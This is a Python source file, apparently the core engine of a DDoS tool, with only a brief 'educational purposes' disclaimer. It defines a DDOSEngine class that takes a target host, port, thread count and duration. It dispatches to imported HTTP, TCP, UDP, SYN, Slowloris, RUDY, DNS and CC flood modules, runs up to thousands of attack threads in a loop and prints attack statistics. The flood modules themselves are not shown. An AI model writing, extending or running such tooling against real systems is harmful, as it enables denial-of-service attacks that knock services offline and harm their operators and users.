#!/usr/bin/env python3
"""
🚀 DDOS Engine - Core Attack Implementation
Created By: Rajsaraswati Jatav
GitHub: https://github.com/RAJSARASWATI-JATAV

⚠️ FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY ⚠️
"""

import threading
import time
import socket
import random
import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from utils.logger import Logger
from modules.http_flood import HTTPFlood
from modules.tcp_flood import TCPFlood
from modules.udp_flood import UDPFlood
from modules.syn_flood import SYNFlood
from modules.slowloris import Slowloris
from modules.rudy_attack import RudyAttack
from modules.dns_flood import DNSFlood
from modules.cc_attack import CCAttack

class DDOSEngine:
    """Core DDOS Attack Engine with Unlimited Threading"""
    
    def __init__(self, target, port, threads, duration, method):
        self.target = target
        self.port = port
        self.threads = threads if threads != 'unlimited' else 10000
        self.duration = duration
        self.method = method
        self.is_running = False
        self.thread_pool = None
        self.logger = Logger()
        self.attack_modules = self._initialize_modules()
        
        # Statistics
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        
    def _initialize_modules(self):
        """Initialize attack modules"""
        return {
            'http_flood': HTTPFlood(self.target, self.port),
            'tcp_flood': TCPFlood(self.target, self.port),
            'udp_flood': UDPFlood(self.target, self.port),
            'syn_flood': SYNFlood(self.target, self.port),
            'slowloris': Slowloris(self.target, self.port),
            'rudy_attack': RudyAttack(self.target, self.port),
            'dns_flood': DNSFlood(self.target, self.port),
            'cc_attack': CCAttack(self.target, self.port)
        }
    
    def start_attack(self):
        """Start the DDOS attack"""
        self.is_running = True
        self.start_time = time.time()
        
        print(f"{Fore.RED}🚀 Starting {self.method.upper()} attack on {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎆 Threads: {self.threads} | Duration: {self.duration}s{Style.RESET_ALL}")
        
        # Create thread pool
        self.thread_pool = ThreadPoolExecutor(max_workers=self.threads)
        
        # Select attack module
        if self.method in self.attack_modules:
            attack_module = self.attack_modules[self.method]
            
            # Launch attack threads
            futures = []
            for i in range(self.threads):
                future = self.thread_pool.submit(self._attack_worker, attack_module)
                futures.append(future)
            
            # Wait for completion or timeout
            time.sleep(self.duration)
            self.stop_attack()
            
        else:
            self.logger.error(f"Unknown attack method: {self.method}")
    
    def _attack_worker(self, attack_module):
        """Individual attack worker thread"""
        while self.is_running:
            try:
                success = attack_module.execute_attack()
                if success:
                    self.successful_requests += 1
                else:
                    self.failed_requests += 1
                self.requests_sent += 1
                
                # Small delay to prevent overwhelming
                time.sleep(0.001)
                
            except Exception as e:
                self.failed_requests += 1
                self.logger.debug(f"Attack worker error: {e}")
    
    def stop_attack(self):
        """Stop the DDOS attack"""
        self.is_running = False
        if self.thread_pool:
            self.thread_pool.shutdown(wait=False)
        
        print(f"\n{Fore.GREEN}✅ Attack stopped{Style.RESET_ALL}")
        self._display_statistics()
    
    def _display_statistics(self):
        """Display attack statistics"""
        duration = time.time() - self.start_time if self.start_time else 0
        avg_speed = self.requests_sent / duration if duration > 0 else 0
        success_rate = (self.successful_requests / self.requests_sent * 100) if self.requests_sent > 0 else 0
        
        print(f"\n{Fore.CYAN}📊 ATTACK STATISTICS:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total Requests: {self.requests_sent}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful: {self.successful_requests}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Failed: {self.failed_requests}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Success Rate: {success_rate:.2f}%{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Average Speed: {avg_speed:.2f} req/s{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Duration: {duration:.2f} seconds{Style.RESET_ALL}")
    
    def get_statistics(self):
        """Get current attack statistics"""
        duration = time.time() - self.start_time if self.start_time else 0
        return {
            'requests_sent': self.requests_sent,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'duration': duration,
            'avg_speed': self.requests_sent / duration if duration > 0 else 0,
            'success_rate': (self.successful_requests / self.requests_sent * 100) if self.requests_sent > 0 else 0
        }